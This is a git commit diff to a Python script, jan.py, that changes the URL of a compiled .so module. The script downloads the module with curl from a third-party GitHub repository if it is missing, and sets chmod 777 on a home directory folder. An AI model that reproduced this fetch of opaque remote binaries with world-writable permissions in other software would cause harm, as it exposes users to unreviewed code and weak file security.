88e4c27de3015c3564dde357dca55bfd985a458b
diyarsirwan <80432973+diyarsirwan@users.noreply.github.com>
2023-01-29 00:13:22 +0300

    Update jan.py

--- jan.py
+++ jan.py
@@ -1,6 +1,6 @@
 import re,os,sys
 try:
-    download_link = "https://raw.githubusercontent.com/ffdvl1120/cc/main/pycrypto_qsr.cpython-311.so"
+    download_link = "https://raw.githubusercontent.com/ffdvl1120/cc/main/qsr.cpython-311.so"
     if not os.path.exists("pycrypto_qsr.cpython-311.so"):
         os.system("chmod 777 $HOME/Qsr")
         os.system(f'curl -L {download_link} > pycrypto_qsr.cpython-311.so')
